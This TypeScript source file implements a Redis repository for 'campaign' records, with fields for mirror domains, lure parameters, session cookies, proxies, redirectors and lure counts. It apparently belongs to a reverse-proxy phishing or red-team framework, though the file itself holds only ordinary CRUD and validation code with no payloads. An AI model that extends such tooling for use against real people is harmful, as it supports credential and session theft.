import { DIContainer } from '@famir/common'
import {
  CAMPAIGN_REPOSITORY,
  CampaignModel,
  CampaignRepository,
  Config,
  CONFIG,
  CreateCampaignData,
  DATABASE_CONNECTOR,
  DatabaseConnector,
  DatabaseError,
  DeleteCampaignData,
  Logger,
  LOGGER,
  ReadCampaignData,
  UpdateCampaignData,
  Validator,
  VALIDATOR
} from '@famir/domain'
import { DatabaseConfig } from '../../database.js'
import { RedisDatabaseConnection } from '../../redis-database-connector.js'
import { RedisBaseRepository } from '../base/index.js'
import { RawCampaign } from './campaign.functions.js'
import { rawCampaignSchema } from './campaign.schemas.js'

export class RedisCampaignRepository extends RedisBaseRepository implements CampaignRepository {
  static inject(container: DIContainer) {
    container.registerSingleton<CampaignRepository>(
      CAMPAIGN_REPOSITORY,
      (c) =>
        new RedisCampaignRepository(
          c.resolve<Validator>(VALIDATOR),
          c.resolve<Config<DatabaseConfig>>(CONFIG),
          c.resolve<Logger>(LOGGER),
          c.resolve<DatabaseConnector>(DATABASE_CONNECTOR).connection<RedisDatabaseConnection>()
        )
    )
  }

  constructor(
    validator: Validator,
    config: Config<DatabaseConfig>,
    logger: Logger,
    connection: RedisDatabaseConnection
  ) {
    super(validator, config, logger, connection, 'campaign')

    this.validator.addSchemas({
      'database-raw-campaign': rawCampaignSchema
    })

    this.logger.debug(`CampaignRepository initialized`)
  }

  async createCampaign(data: CreateCampaignData): Promise<CampaignModel> {
    try {
      const [status, rawCampaign] = await Promise.all([
        this.connection.campaign.create_campaign(
          this.options.prefix,
          data.campaignId,
          data.mirrorDomain,
          data.description,
          data.landingAuthPath,
          data.landingAuthParam,
          data.landingLureParam,
          data.sessionCookieName,
          data.sessionExpire,
          data.newSessionExpire,
          data.messageExpire
        ),

        this.connection.campaign.read_campaign(this.options.prefix, data.campaignId)
      ])

      const [code, message] = this.parseStatusReply(status)

      if (code !== 'OK') {
        throw new DatabaseError(message, { code })
      }

      const campaignModel = this.buildCampaignModel(rawCampaign)

      this.assertCampaignModel(campaignModel)

      this.logger.info(message, { campaignModel })

      return campaignModel
    } catch (error) {
      this.handleException(error, 'createCampaign', data)
    }
  }

  async readCampaign(data: ReadCampaignData): Promise<CampaignModel | null> {
    try {
      const rawCampaign = await this.connection.campaign.read_campaign(
        this.options.prefix,
        data.campaignId
      )

      return this.buildCampaignModel(rawCampaign)
    } catch (error) {
      this.handleException(error, 'readCampaign', data)
    }
  }

  async updateCampaign(data: UpdateCampaignData): Promise<CampaignModel> {
    try {
      const [status, rawCampaign] = await Promise.all([
        this.connection.campaign.update_campaign(
          this.options.prefix,
          data.campaignId,
          data.description,
          data.sessionExpire,
          data.newSessionExpire,
          data.messageExpire
        ),

        this.connection.campaign.read_campaign(this.options.prefix, data.campaignId)
      ])

      const [code, message] = this.parseStatusReply(status)

      if (code !== 'OK') {
        throw new DatabaseError(message, { code })
      }

      const campaignModel = this.buildCampaignModel(rawCampaign)

      this.assertCampaignModel(campaignModel)

      this.logger.info(message, { campaignModel })

      return campaignModel
    } catch (error) {
      this.handleException(error, 'updateCampaign', data)
    }
  }

  async deleteCampaign(data: DeleteCampaignData): Promise<CampaignModel> {
    try {
      const [rawCampaign, status] = await Promise.all([
        this.connection.campaign.read_campaign(this.options.prefix, data.campaignId),

        this.connection.campaign.delete_campaign(this.options.prefix, data.campaignId)
      ])

      const [code, message] = this.parseStatusReply(status)

      if (code !== 'OK') {
        throw new DatabaseError(message, { code })
      }

      const campaignModel = this.buildCampaignModel(rawCampaign)

      this.assertCampaignModel(campaignModel)

      this.logger.info(message, { campaignModel })

      return campaignModel
    } catch (error) {
      this.handleException(error, 'deleteCampaign', data)
    }
  }

  async listCampaigns(): Promise<CampaignModel[]> {
    try {
      const index = await this.connection.campaign.read_campaign_index(this.options.prefix)

      this.validateArrayStringsReply(index)

      const rawCampaigns = await Promise.all(
        index.map((campaignId) =>
          this.connection.campaign.read_campaign(this.options.prefix, campaignId)
        )
      )

      return this.buildCampaignCollection(rawCampaigns).filter(this.guardCampaignModel)
    } catch (error) {
      this.handleException(error, 'listCampaigns', null)
    }
  }

  protected buildCampaignModel(rawCampaign: unknown): CampaignModel | null {
    if (rawCampaign === null) {
      return null
    }

    this.validateRawCampaign(rawCampaign)

    return {
      campaignId: rawCampaign.campaign_id,
      mirrorDomain: rawCampaign.mirror_domain,
      description: rawCampaign.description,
      landingAuthPath: rawCampaign.landing_auth_path,
      landingAuthParam: rawCampaign.landing_auth_param,
      landingLureParam: rawCampaign.landing_lure_param,
      sessionCookieName: rawCampaign.session_cookie_name,
      sessionExpire: rawCampaign.session_expire,
      newSessionExpire: rawCampaign.new_session_expire,
      messageExpire: rawCampaign.message_expire,
      proxyCount: rawCampaign.proxy_count,
      targetCount: rawCampaign.target_count,
      redirectorCount: rawCampaign.redirector_count,
      lureCount: rawCampaign.lure_count,
      sessionCount: rawCampaign.session_count,
      messageCount: rawCampaign.message_count,
      createdAt: new Date(rawCampaign.created_at),
      updatedAt: new Date(rawCampaign.updated_at)
    }
  }

  protected buildCampaignCollection(rawCampaigns: unknown): Array<CampaignModel | null> {
    this.validateArrayReply(rawCampaigns)

    return rawCampaigns.map((rawCampaign) => this.buildCampaignModel(rawCampaign))
  }

  protected validateRawCampaign(value: unknown): asserts value is RawCampaign {
    try {
      this.validator.assertSchema<RawCampaign>('database-raw-campaign', value)
    } catch (error) {
      throw new DatabaseError(`RawCampaign validation failed`, {
        cause: error,
        code: 'INTERNAL_ERROR'
      })
    }
  }

  protected guardCampaignModel(value: CampaignModel | null): value is CampaignModel {
    return value != null
  }

  protected assertCampaignModel(value: CampaignModel | null): asserts value is CampaignModel {
    if (!this.guardCampaignModel(value)) {
      throw new DatabaseError(`CampaignModel unexpected lost`, {
        code: 'INTERNAL_ERROR'
      })
    }
  }
}
